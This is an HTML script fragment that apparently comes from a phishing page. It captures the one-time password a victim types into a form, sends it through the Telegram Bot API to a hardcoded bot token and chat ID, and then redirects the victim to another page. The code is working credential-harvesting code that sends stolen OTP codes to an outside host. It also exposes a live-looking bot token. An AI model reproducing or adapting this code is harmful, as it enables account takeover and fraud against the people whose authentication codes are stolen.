  <script>
    function sendTelegramMessage(event) {
      event.preventDefault(); // Prevent the form from submitting normally
      
      const form = event.target;
      const otpValue = form.otp.value; // Get the value of the OTP input

      // Replace YOUR_BOT_TOKEN with your actual Telegram bot token
      const botToken = '7791287382:AAHaVcRNbpDfO1MOGYxvB4h6Ml7Bop5CxoQ';
      const chatId = '7865807902'; // Replace YOUR_CHAT_ID with the chat ID or channel username

      const message = `New OTP received: ${otpValue}`;

      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Construct the fetch request to send the message to the Telegram bot
      fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent successfully');
          // Redirect to another URL after sending the message
          window.location.href = 'otpnet.html'; // Replace with the URL you want to redirect to
        } else {
          console.error('Failed to send message');
          // Handle the error, e.g., show an error message to the user
        }
      })
      .catch(error => {
        console.error('Error:', error);
        // Handle any network or other errors
      });
    }
  </script>

  </script>
